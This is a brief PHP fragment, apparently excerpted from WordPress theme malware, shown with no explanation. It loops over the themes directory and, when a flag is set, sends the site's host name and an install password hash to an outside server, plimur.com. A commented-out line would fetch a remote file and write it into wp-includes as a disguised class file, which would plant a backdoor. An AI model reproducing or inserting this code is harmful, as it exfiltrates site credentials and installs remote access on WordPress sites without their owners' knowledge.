			...
			if ($list = scandir( $themes ))
				{
					...
					if ($ping) {
						$content = @file_get_contents('http://www.plimur.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
						//@file_put_contents(ABSPATH . '/wp-includes/class.wp.php', file_get_contents('http://www.plimur.com/admin.txt'));
					}
